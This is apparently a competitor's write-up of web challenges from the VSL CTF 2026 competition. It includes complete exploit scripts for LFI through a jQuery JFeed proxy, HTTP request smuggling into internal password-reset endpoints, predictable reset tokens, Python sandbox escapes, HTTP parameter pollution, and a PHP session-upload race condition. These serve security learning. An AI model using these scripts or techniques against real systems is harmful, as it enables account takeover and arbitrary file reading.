
---
title: VSL CTF Web Challenges
date: 2026-01-26 19:30:00 +0700
categories: [Web Exploitation, VSL, GraphQL, IDOR, Local File Inclusion, JFeed Proxy, Race Condition, HTTP Request Smuggling, WAF Bypass, SSTI, HTTP Parameter Pollution]
tags: [web, vsl, graphql, idor, lfi, toctou, smuggling, waf, ssti, hpp]
author: khoa
description: VSL CTF 2026
toc: true
comments: true
---

## **ALL WRITEUPS**
### mrGraph
![img-description](https://i.ibb.co/KcJkb2DM/image-2026-01-26-194344646.png)

_Website_

This website uses ```GraphQL``` and it handle queries in ```/api/query```.

![img-description](https://i.ibb.co/RT3WnstQ/image-2026-01-26-194457581.png)

_Explore the request_

And in the description I saw hints like: ```Accidentally slipped in the admin password```, ```Quickly tried to hide it```, so I immediately thought of the ```postPassword``` and ```isHidden``` fields.

After using the query: ```{ p4: post(id: 4) { id title content postPassword isHidden author { username } } }```, I immediately found the flag.

![img-description](https://i.ibb.co/Jw3ZTwzb/image-2026-01-26-194610860.png)

_Found the flag_

### Key Game
![img-description](https://i.ibb.co/WWtCQyqJ/image-2026-01-26-194913051.png)

_Website_

After messing around with the website for a while, I couldn't find anything because I kept failing at the first step.

In the ```Dockerfile```, I noticed it's installing the ```libjs-jquery-jfeed``` package, which is a big clue.

After analyzing the source code, I found that the server not only checks whether you selected the Left or Right lane, but it also requires you to send a verification code h.

![img-description](https://i.ibb.co/0Vf3dYdC/image-2026-01-26-195503041.png)

_Local Debugging_

After running it with Docker and debugging locally, I found jfeed ```proxy.php```, which uses the fopen function and can open both files and URLs.

![img-description](https://i.ibb.co/TS1n2fX/image-2026-01-26-200626538.png)

_Local Debugging_

And I found that in ```/etc/apache2``` there is ```Alias /javascript /usr/share/javascript```.

So I obtained the secret key using the LFI vulnerability via JFeed Proxy.

![img-description](https://i.ibb.co/tpG9DHHb/image-2026-01-26-200917728.png)

_Got the secret key_

And how do i find the flag after getting the secret key?

In the ```piano_game.js```, look at these two functions:

```serverRespawn()```: Calls ```?act=respawn```. The server will then generate a random 40-step route.

```serverMove(step, side)```: Sends the current step to the server for verification.

The question is: Between these two calls, where does the server store those 40 steps for comparison?

It's not in the database (because the Dockerfile doesn't have SQL installed).

It's not in a static file (because each player has a different route).

```Conclusion```: It must be in that user's session memory on the server.

When you examine the requests sent to the server, you'll see that the browser always includes a cookie.

After using LFI again via JFeed proxy to check the session file, I found that the path data had been stored in PHP serialized format as follows:

![img-description](https://i.ibb.co/qM00S61p/image-2026-01-26-202318966.png)

_Session File_

And I wrote a Python script to automate the flag finding process:

```python
import requests
import re
import hashlib

HOST = "http://124.197.22.141:7878"
SECRET_KEY = "4d55c523-329f-4a06-a050-a1e1516c147b"
PROXY_PATH = "/javascript/jquery-jfeed/proxy.php"

def solve():
    s = requests.Session()
    try:
        s.get(f"{HOST}/index.php?act=respawn", timeout=5)
    except Exception as e:
        print(f"{e}")
        return

    sess_id = s.cookies.get("PHPSESSID")
    if not sess_id:
        print("Cannot get PHPSESSID")
        return
    print(f"[*] PHPSESSID: {sess_id}")

    path_variants = [
        f"/var/lib/php/sessions/sess_{sess_id}",
        f"/tmp/sess_{sess_id}"
    ]
    
    session_data = ""
    for file_path in path_variants:
        proxy_url = f"{HOST}{PROXY_PATH}?url={file_path}"
        try:
            r = requests.get(proxy_url, headers={"Cookie": ""}, timeout=5)
            if "path|" in r.text:
                session_data = r.text
                print(f"Got session data from {file_path}")
                break
        except:
            continue

    if not session_data:
        print("Cannot retrieve session data")
        print(f"Session data: {r.text[:100]}")
        return
    
    correct_path = []
    for i in range(40):
        pattern = f"i:{i};i:(\d+);" 
        match = re.search(pattern, session_data)
        if match:
            correct_path.append(int(match.group(1)))
        else:
            print(f"Cannot find step {i} in session data")
            return

    print(f"[+] Map: {correct_path}")

    for step, side in enumerate(correct_path):
        raw = f"{SECRET_KEY}|{step}|{side}"
        h = hashlib.md5(raw.encode()).hexdigest()
        
        url = f"{HOST}/index.php?act=move&step={step}&side={side}&h={h}"
        
        try:
            resp = s.get(url, timeout=2).text
            if "VSL{" in resp:
                print(f"\n\n[🏆] JACKPOT! FLAG: {resp.split('|')[1]}")
                return
            elif "ok" not in resp:
                print(f"\nError at step{step}: {resp}")
                return
            print(f".", end="", flush=True)
        except:
            print("timeout", end="")

    print("\nEnd of steps reached without finding the flag.")

if __name__ == "__main__":
    solve()
```

![img-description](https://i.ibb.co/VcRSVq6r/image-2026-01-26-202630814.png)

_Flag_

And we got the flag :D

### CornHub 
![img-description](https://i.ibb.co/cc5x9fDg/image-2026-01-26-203836297.png)

_Website_

After analyzing the source code, I found ```5 key points```.

In ```app.js```:
```js
function sendPostRequest(host, port, path, payload, headers = {}, sessionId = '') {
    return new Promise((resolve, reject) => {
        const postData = typeof payload === 'object' ? querystring.stringify(payload) : payload;
        
        let cookieHeader = '';
        if (sessionId) {
            cookieHeader = `session_id=${sessionId}`;
        }
        
        const options = {
            host,
            port,
            path,
            method: 'POST',
            headers: Object.assign({
                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            }, cookieHeader ? { 'Cookie': cookieHeader } : {}, headers)
        };
        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch {
                    resolve(data);
                }
            });
        });
        req.setTimeout(1000, () => {
            req.abort();
            reject(new Error("Request timed out"));
        });
        req.on('error', (e) => reject(e));
        console.log("--- GATEWAY SENDING TO BACKEND ---");
        console.log("Path:", path);
        console.log("Headers:", JSON.stringify(options.headers, null, 2));
        console.log("Body:", postData);
        console.log("----------------------------------");
        req.write(postData);
        req.end();
    });
}
```

The Object.assign function prioritizes attributes from user-controlled header variables. When you send headers: ```{"Content-Length": "1"}```, the Gateway will send this value 1 to the Backend instead of the actual length of the payload.

=> The Backend (Uvicorn) only reads exactly 1 byte for the first request; the remaining data in the Socket will be processed as a completely new second request => ```HTTP Request Smuggling```.

```js
app.post('/debug', async (req, res) => {
    const { data, headers, access_token } = req.body; 
    if (!access_token) {
        return res.status(401).json({ error: 'Missing access_token' });
    }
    try {
        let requestHeaders = {};
        if (headers) {
            try {
                requestHeaders = JSON.parse(headers);
            } catch (e) {
                return res.status(400).json({ error: 'Invalid headers format. Must be a valid JSON string.', details: e.message });
            }
        }
        const finalHeaders = {
            Authorization: `Bearer ${access_token}`,
            ...requestHeaders
        };
        
        const response = await sendPostRequest(BACKEND.host, BACKEND.port, '/process/debug', data, finalHeaders, req.sessionId);
        res.json(response);
    } catch (err) {
        res.status(500).json({ error: 'Debugging failed', details: err.message });
    }
});
```

Also, the ```if (!access_token)``` statement only checks if the variable contains data. It doesn't call the ```verify JWT```` function, doesn't check the signature, and doesn't check the expiration date.

=> As long as you send ```access_token=anything```, the Gateway will consider the security condition met and continue forwarding the request to the Backend.

In ```main.py```, routes in the /auth/ group don't require ```JWT``` and are marked ```Internal Only``` because the Gateway doesn't define routes to forward them outwards. However, thanks to ```Smuggling```, you can send requests directly to these endpoints from "inside" your Docker internal network.

In ```auth_service.py```:

```python
def forgot_password(email: str):
    user = get_user_by("email", email)
    if not user:
        raise HTTPException(status_code=404, detail="Email not found")

    timestamp = datetime.datetime.now().strftime("%Y:%m:%d-%H:%M")
    base = f"{user['email']}{user['username']}{user['dob']}{timestamp}"
    print(f"[DEBUG] Backend Base String: {base}")
    token = hash_sha256(base)
    expiry = (datetime.datetime.now() + datetime.timedelta(minutes=15)).isoformat()

    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT OR REPLACE INTO reset_tokens (username, token, expires_at) VALUES (?, ?, ?)", 
                     (user["username"], token, expiry))

    print(f"[DEBUG] Forgot password requested for {base}")
    print(f"[DEBUG] Reset token for {email}: {token}")
    print(f"[DEBUG] Token expires at: {expiry}")

    return {"message": "Reset token generated", "token": token}
```

The token is not random but calculated based on static information (email, username, dob from db.py) and the current server time. By using the timestamp from the HTTP Response Date header, you can accurately calculate this token.

In ```app.js```:
```js
app.use((req, res, next) => {
    const originalJson = res.json;
    
    res.json = function(data) {
        if (req.path === '/documents') {
            const responseStr = JSON.stringify(data);
            if (responseStr.includes('flag_2.txt')) {
                return res.status(403).json({
                    error: "Access denied - forbidden content detected"
                });
            }
        }
        return originalJson.call(this, data);
    };
    
    if (req.path === '/documents' && req.method === 'POST') {
        const requestStr = JSON.stringify(req.body);
        if (requestStr.includes('flag_2.txt')) {
            return res.status(403).json({
                error: "Access denied - forbidden content detected"
            });
        }
    }
    
    next();
});
```

This middleware only blocks if the ```req.path``` is exactly ```/documents```. By adding a forward slash to the end ```(/documents/)```, you make the if condition false. Because Express and FastAPI treat ```/path``` and ```/path/``` as the same, the request is still processed and Flag 2 is leaked.

Also in ```utils.py```:

```python
def filter(file_name: str):
    if ".." in file_name or file_name.startswith("/"):
        raise HTTPException(status_code=403, detail="Forbidden character(s)")

```
And ```process_service.py```:

```python
def search_document(file_name: str = Form(...)):
    document_dir = "/cornhub"
    
    try:
        filter(file_name)
        normalize_name = os.path.expandvars(file_name)
        file_path = os.path.join(document_dir, normalize_name)
        with open(file_path, 'rb') as file:
            file_content = file.read()
        
        encoded_file_content = base64.b64encode(file_content).decode('utf-8')
        file_type = mimetypes.guess_type(file_path)[0]

        return {
            "content": encoded_file_content,
            "mime_type": file_type or "text/plain",
            "file_name": os.path.basename(file_path)
        }
    except Exception as e:
        return {"error": str(e)}
```

When you send ```${HOME}/flag_1.txt```, it doesn't start with a ```/``` so it slips through the filter. Then, the ```os.path.expandvars``` function will transform it into ```/home/appuser/flag_1.txt```, allowing the file to be read anywhere on the system.

That's enough explanation; I've written a script to automatically find the flag:
```python
import requests
import hashlib
import json
import base64
from datetime import datetime, timedelta
from urllib.parse import quote

TARGET_IP = "124.197.22.141"
PORT = 6336
BASE_URL = f"http://{TARGET_IP}:{PORT}"
ADMIN_EMAIL = "admin@cornhub.com"
ADMIN_USER = "admin"
ADMIN_DOB = "2005-08-05" 
NEW_PASS = "fptu_hacker_2026"

def get_sha256_token(ts):
    base = f"{ADMIN_EMAIL}{ADMIN_USER}{ADMIN_DOB}{ts}"
    return hashlib.sha256(base.encode()).hexdigest()

def build_smuggled_request(path, body):
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: backend\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    return req

def send_smuggle_payload(smuggled_content):
    headers_json = json.dumps({"Content-Length": "1"})

    payload = (
        f"access_token=anything&"
        f"headers={quote(headers_json)}&"
        f"data={quote('a' + smuggled_content).replace('+', '%20')}"
    )
    
    return requests.post(
        f"{BASE_URL}/debug",
        data=payload,
        headers={'Content-Type': 'application/x-www-form-urlencoded'},
        timeout=10
    )

def pwn():
    res = requests.get(BASE_URL)
    server_date = datetime.strptime(res.headers.get('Date'), '%a, %d %b %Y %H:%M:%S %Z')
    
    for tz in [0, 7]:
        now = server_date + timedelta(hours=tz)
        
        for offset in [0, 1]:
            ts = (now + timedelta(minutes=offset)).strftime("%Y:%m:%d-%H:%M")
            token = get_sha256_token(ts)
            
            forgot_req = build_smuggled_request("/auth/forgot_password", f"email={ADMIN_EMAIL}")
            send_smuggle_payload(forgot_req)
            
            update_body = f"username={ADMIN_USER}&token={token}&new_password={NEW_PASS}"
            update_req = build_smuggled_request("/auth/update_password", update_body)
            send_smuggle_payload(update_req)
            
            login = requests.post(f"{BASE_URL}/login", data={"username": ADMIN_USER, "password": NEW_PASS})
            if login.status_code == 200 and "access_token" in login.text:
                jwt = login.json().get("access_token")
                
                f1 = requests.post(f"{BASE_URL}/documents", data={"file_name": "${HOME}/flag_1.txt", "access_token": jwt})
                print(f"[!] FLAG 1: {base64.b64decode(f1.json()['content']).decode()}")
                
                f2 = requests.post(f"{BASE_URL}/documents/", data={"file_name": "${HOME}/flag_2.txt", "access_token": jwt})
                print(f"[!] FLAG 2: {base64.b64decode(f2.json()['content']).decode()}")
                return
    print("\nError: Unable to retrieve flags.")

if __name__ == "__main__":
    pwn()
```

![img-description](https://i.ibb.co/hrwhppw/image-2026-01-26-210430355.png)

_Found Flag_

And we found the flag :D

### PyRunner
I solved this chall by using this script:
```python
try:
    raise Exception
except Exception as e:
    t = e.__traceback__
    frame = t.tb_frame.f_back

    b = frame.f_builtins

    imp = b['__im' + 'port__']
    opener = b['op' + 'en']

    os = imp('o' + 's')

    files = os.listdir('/')
    print("Files found:", files)
    
    for filename in files:
        if 'flag' in filename:
            full_path = '/' + filename
            print("Reading:", full_path)
            print(opener(full_path).read())
```

![img-description](https://i.ibb.co/XZnW8LM5/image-2026-01-26-211059583.png)

_Found Flag_

And i got the flag :D

### Trust Issue
![img-description](https://i.ibb.co/pj801S7q/image-2026-01-26-211908400.png)

_Website_

After analyzing the source code, i found some key points:

The get_login_user() function reads the log file from bottom to top.

Any line that starts with ```user=...``` will be considered the current user.

For ```user=admin``` to be valid, you must log in with the correct Admin password (hidden in the flag.txt file at startup).

In ```app.py```, the author enables debug logging for the ```CORS library```: ```logging.getLogger('flask_cors').level = logging.DEBUG```

The ```flask_cors``` library will log debug information every time a request is sent, including the URL path.

=> Flask automatically decodes the path before processing it. The ```%0A``` character (newline character) in the URL will become a true ```\n``` in memory and when written to the file.

![img-description](https://i.ibb.co/4nhrW4ZH/image-2026-01-26-212441593.png)
_Admin_

I'm now an admin wtf?

Endpoint /calc allows calculations but has very strict filters:

```python
allowed_chars = "0123456789+-*/"
if not all(char in allowed_chars for char in text):
    return 'Do not cheat hack!!!', 503
```

We can see the vuln ```HTTP Parameter Pollution - HPP```: Flask forwards requests to PHP using ```request.query_string```.

```Flask(request.args.get('text'))```: Only retrieves the first text value.

```PHP($_GET['text'])```: Always retrieves the last text value if multiple parameters have the same name.

In Python, everything is an object. Even if builtins are deleted, we can still "climb" from a basic object to find lost functions.

So i build this payload:

```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()._module.__builtins__['open']('flag.txt').read()
```

After i HPP by adding 1 more text param with the payload:

![img-description](https://i.ibb.co/N22K0nJQ/image-2026-01-26-213315661.png)

_Found Flag_

And i got the flag :D

### PyRunner2
I solved this chall by using this script:
```python
try:
    raise Exception
except Exception as e:
    t = e.__traceback__
    fr = t.tb_frame.f_back

    g = fr.f_globals

    b = g['__buil' + 'tins__']
    imp = b['__im' + 'port__']
    ga = b['get' + 'attr']
    
    m = imp('o' + 's')

    my_listdir = ga(m, 'list' + 'dir')
    my_open = ga(m, 'op' + 'en')
    my_read = ga(m, 're' + 'ad')
    
    root_files = my_listdir('/')
    
    for f in root_files:
        if 'flag' in f:
            path = '/' + f
            fd = my_open(path, 0)
            content = my_read(fd, 100)
            print("FLAG:", content)

except Exception as e:
    print("Error:", e)
```

![img-description](https://i.ibb.co/qL47g4jz/image-2026-01-26-211329577.png)

_Found Flag_

And i got the flag :D

### Web Easy Easy
![img-description](https://i.ibb.co/GQs9z5yh/image-2026-01-26-223527656.png)
_Website_

After analyzing the source code, I plan to implement LFI by reading the session file via ```audio.php```.

But the biggest problem is that the server only allows audio files, and it completely trust in ```mime_content_type```.

We can't directly upload files to the server's ```/audio/``` directory (because it's blocked). But we can take advantage of a built-in PHP feature: Session Upload Progress.

```Mechanism```: When you send a file (any file) along with a POST data file named PHP_SESSION_UPLOAD_PROGRESS, PHP automatically creates a temporary session file in ```/tmp/``` (e.g., /tmp/sess_123abc).

Contents of this file: It contains the line ```upload_progress_``` plus the data we sent.

```Opportunity```: This is the only way we can write arbitrary content to the server.

```Problem```: The session file always starts with `upload_progress_` (this is text).

If we insert the ```MP3``` (FF FB) header immediately after it, ```libmagic``` detects garbage at the beginning, saying "This is garbage binary" (application/octet-stream) and blocking it.

I discovered that the old audio format called Amiga Module (.mod) has a very strange way of identifying files.

It ignores the first 1080 bytes (considered the song title).

It only checks the 4 bytes at position 1080. If it sees `M.K.`, it declares "This is music!".

Exploitation:

Bytes 0-15: `upload_progress_` (PHP auto-write).

Bytes 16-1079: We insert `\x00` (garbage padding).

Byte 1080: We write `M.K.`.

Result: The server ignores the junk text at the beginning, jumps straight to byte 1080, finds M.K., and believes it's an audio/x-mod file -> Allows it through!

Although the "Gatekeeper" was tricked, this session file only existed for a fleeting moment.

```Mechanism```: As soon as the upload process is complete, PHP cleans up and deletes the session file (session.upload_progress.cleanup = On).

```Attack```: We must perform two actions in parallel:

```Thread 1 (Upload)```: Send a very large file (with a fake MOD payload). The large file causes the server to take longer to process, keeping the session file alive longer.

```Thread 2 (Read)```: Continuously send requests to ```audio.php?f=../../tmp/sess_...``` to read that file before it is deleted.

I wrote a Python script to automate flag finding:

```python
import requests
import threading
import io
import os
import time
import random
import string

TARGET_URL = "http://61.14.233.78:8081" 
THREAD_COUNT = 100
PADDING = b"\x00" * 1064
MAGIC_BYTES = b"M.K."
FAT_TRAILER = b"\x00" * (100 * 1024) 
FINAL_PAYLOAD = PADDING + MAGIC_BYTES + FAT_TRAILER

def generate_session_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=26))

def attack_worker():
    s = requests.Session()
    
    while True:
        session_id = generate_session_id()
        cookies = {"PHPSESSID": session_id}
        stop_flag = threading.Event()

        def uploader():
            try:
                files = {'file': ('heavy.mod', io.BytesIO(b'A'*1024), 'audio/x-mod')}
                data = {"PHP_SESSION_UPLOAD_PROGRESS": FINAL_PAYLOAD}
                s.post(f"{TARGET_URL}/index.php", files=files, data=data, cookies=cookies, timeout=5)
            except:
                pass
            finally:
                stop_flag.set()

        def reader():
            target_path = f"../../../../tmp/sess_{session_id}"
            
            while not stop_flag.is_set():
                try:
                    r = s.get(f"{TARGET_URL}/audio.php", params={'f': target_path}, cookies=cookies, timeout=1)
                    
                    if "VSL{" in r.text:
                        print(f"BINGO! FLAG FOUND! Session: {session_id}")
                        print(r.text.strip())
                        os._exit(0)
                    
                    elif r.status_code == 200:
                        print(f"[+] 200 OK! {r.headers.get('Content-Type')} - Len: {len(r.text)}")
                        if "flag" in r.text.lower() or "VSL" in r.text:
                            print(r.text)
                            os._exit(0)
                except:
                    pass

        t_up = threading.Thread(target=uploader)
        t_read = threading.Thread(target=reader)
        
        t_up.start()
        t_read.start()
        
        t_up.join()
        t_read.join()
        print(".", end="", flush=True)

if __name__ == "__main__":
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping attack...")
```

![img-description](https://i.ibb.co/JjfZ1YQj/image-2026-01-26-224623557.png)
_Flag Found_

And i got the flag :D

## **Conclusion**
### My thoughts
VSL CTF is very fun tho lol, and all the challs are sick, pretty new to me haha. Btw my team some how managed to get top 14th :v

### End
Well, that's all for my writeup =))) Have a great day everyone, I'm going to sleep now.

